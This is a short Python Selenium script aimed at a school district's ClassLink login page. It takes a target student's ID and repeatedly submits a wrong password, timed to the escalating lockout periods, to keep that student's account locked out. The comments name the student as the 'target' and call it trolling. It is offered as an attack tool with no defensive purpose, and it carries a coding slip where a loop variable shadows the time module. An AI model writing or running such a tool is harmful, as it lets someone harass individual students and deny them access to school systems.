#Import modules
import requests
import time

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options


#Save login credientials and targetted urls
PATH = <ENTER PATH HERE>
USERNAME = <ENTER USERNAME HERE> #This should be the student ID number of desired target
PASSWORD = "WeDoALittleBitOfTrolling"
LOGIN_URL = 'https://launchpad.classlink.com/rrisd'

lock_list = [15, 30, 60, 90, 150, 300]

class Session:
  
   def __init__(self):
        #options = Options()
        options = webdriver.ChromeOptions()
        options.add_experimental_option("detach", True)
        self.driver = webdriver.Chrome(PATH, options=options)
        self.driver.get(LOGIN_URL)
        
   def enter_credentials(self):
    
        #Enter credentials seven times
        search = self.driver.find_element_by_id("username")
        search.send_keys(USERNAME)
        search = self.driver.find_element_by_id("password")
        
        #Send the payload of username and password information
        
        for i in range(6):
          search.send_keys(PASSWORD)
          search.send_keys(Keys.RETURN)
          
        #Send password twice
        for time in lock_list:
        
              search.send_keys(PASSWORD)
              search.send_keys(Keys.RETURN)
        
              search.send_keys(PASSWORD)
              search.send_keys(Keys.RETURN)
        
              #Sleep for the lockout
              time.sleep(time)
   
def main():
  grading_session = Session()
  grading_session.enter_credentials()
      
if __name__ == '__main__':
    main()
